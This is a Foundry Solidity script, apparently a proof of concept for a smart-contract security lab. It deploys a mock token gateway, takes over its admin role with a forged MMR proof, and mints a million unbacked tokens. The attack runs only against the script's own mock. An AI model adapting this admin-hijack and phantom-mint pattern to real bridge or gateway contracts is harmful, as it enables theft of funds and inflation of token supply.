// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../../src/mocks/MockTokenGateway.sol";

contract PhantomMintAttack is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(deployerPrivateKey); // explicitly derive your wallet address

        vm.startBroadcast(deployerPrivateKey);

        MockTokenGateway gateway = new MockTokenGateway();

        console.log("--- INITIATING VECTOR 2: PHANTOM MINT ---");

        // Attacker bypasses gateway checks to escalate privileges using the correct address
        gateway.changeAdmin(attacker, bytes("fakeMMRproof"));
        console.log("Admin hijacked.");

        // Attacker mints unbacked tokens
        gateway.mintPhantom(1000000 ether);

        console.log("Result: ", gateway.phantomMinted() / 1 ether, "phantom tokens minted.");
        console.log("Status: EXPLOIT SUCCESSFUL (TRAP INACTIVE)");

        vm.stopBroadcast();
    }
}
